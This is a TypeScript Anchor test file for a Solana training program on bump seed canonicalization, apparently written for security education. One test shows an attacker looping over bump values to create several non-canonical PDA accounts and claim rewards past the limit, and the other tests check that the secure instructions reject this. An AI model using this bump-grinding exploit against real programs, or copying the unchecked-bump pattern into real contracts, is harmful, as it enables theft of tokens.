import * as anchor from "@coral-xyz/anchor";
import { Program, web3 } from "@coral-xyz/anchor";
import { BumpSeedCanonicalization } from "../target/types/bump_seed_canonicalization";
import { safeAirdrop } from "./utils/utils";
import {
    createMint,
    getAccount,
    getAssociatedTokenAddress,
} from "@solana/spl-token";
import { expect } from "chai";

describe("bump-seed-canonicalization", () => {
    // Configure the client to use the local cluster.
    anchor.setProvider(anchor.AnchorProvider.env());
    const connection = anchor.getProvider().connection;

    const program = anchor.workspace
        .BumpSeedCanonicalization as Program<BumpSeedCanonicalization>;
    const provider = anchor.AnchorProvider.env();
    anchor.setProvider(anchor.AnchorProvider.env());
    const payer = web3.Keypair.generate();

    let mint, mintAuthority;

    before(async () => {
        await safeAirdrop(payer.publicKey, provider.connection);
        [mintAuthority] = web3.PublicKey.findProgramAddressSync(
            [Buffer.from("mint")],
            program.programId
        );

        mint = await createMint(
            provider.connection,
            payer,
            mintAuthority,
            mintAuthority,
            0
        );
        console.log("Token Mint", mint);
    });

    it("Attacker can claim more than reward limit with insecure instructions", async () => {
        const attacker = web3.Keypair.generate();
        await safeAirdrop(attacker.publicKey, provider.connection);

        const ataKey = await getAssociatedTokenAddress(
            mint,
            attacker.publicKey
        );

        let numClaims = 0;

        // 从小到大, 找bump， 和正常反着来
        for (let i = 0; i < 256; i++) {
            try {
                const pda = web3.PublicKey.createProgramAddressSync(
                    [attacker.publicKey.toBuffer(), Buffer.from([i])],
                    program.programId
                );
                await program.methods
                    .createUserInsecure(i)
                    .accounts({
                        user: pda,
                        payer: attacker.publicKey,
                    })
                    .signers([attacker])
                    .rpc();
                await program.methods
                    .claimInsecure(i)
                    .accounts({
                        user: pda,
                        mint,
                        payer: attacker.publicKey,
                        // userAta: ataKey,
                    })
                    .signers([attacker])
                    .rpc();

                numClaims += 1;
                console.log("claim成功次数: ", numClaims);

                // 不搞太多次, 不然测试时间很长
                if (numClaims > 4) {
                    break;
                }
            } catch (error) {
                if (
                    error.message !==
                    "Invalid seeds, address must fall off the curve"
                ) {
                    console.log(error);
                }
            }
        }

        const ata = await getAccount(provider.connection, ataKey);

        console.log(
            `Attacker claimed ${numClaims} times and got ${Number(
                ata.amount
            )} tokens`
        );

        expect(numClaims).to.be.greaterThan(1);
        expect(Number(ata.amount)).to.be.greaterThan(10);
    });

    it("secure create & claim", async () => {
        let tx = await program.methods.createUserSecure().accounts({}).rpc();

        let tx2 = await program.methods
            .claimSecure()
            .accounts({
                mint: mint,
            })
            .rpc();

        const ataKey = await getAssociatedTokenAddress(
            mint,
            provider.wallet.publicKey
        );

        let ata = await getAccount(connection, ataKey);
        expect(Number(ata.amount)).to.equal(10);
    });

    it("mutil create & claim expect fail", async () => {
        const attacker = web3.Keypair.generate();
        await safeAirdrop(attacker.publicKey, connection);
        const tx = await program.methods
            .createUserSecure()
            .accounts({
                payer: attacker.publicKey,
            })
            .transaction();

        let sig = await web3.sendAndConfirmTransaction(connection, tx, [
            attacker,
        ]);

        try {
            const tx2 = await program.methods
                .createUserSecure()
                .accounts({
                    payer: attacker.publicKey,
                })
                .transaction();

            let sig2 = await web3.sendAndConfirmTransaction(connection, tx2, [
                attacker,
            ]);
        } catch (error) {
            console.error(error);
            expect(error.message).include("already in use");
        }

        console.log("xxxxxxxxx===========");

        let tx3 = await program.methods
            .claimSecure()
            .accounts({
                payer: attacker.publicKey,
                mint: mint,
            })
            .transaction();
        let sig3 = await web3.sendAndConfirmTransaction(connection, tx3, [
            attacker,
        ]);

        try {
            let tx4 = await program.methods
                .claimSecure()
                .accounts({
                    payer: attacker.publicKey,
                    mint: mint,
                })
                .transaction();
            let sig4 = await web3.sendAndConfirmTransaction(connection, tx4, [
                attacker,
            ]);
            console.log("sig4:", sig4.toString());
        } catch (error) {
            console.error(error);
            expect(error);
        }

        const ataKey = await getAssociatedTokenAddress(
            mint,
            attacker.publicKey
        );

        let ata = await getAccount(connection, ataKey);
        expect(Number(ata.amount)).to.equal(10);
    });
});
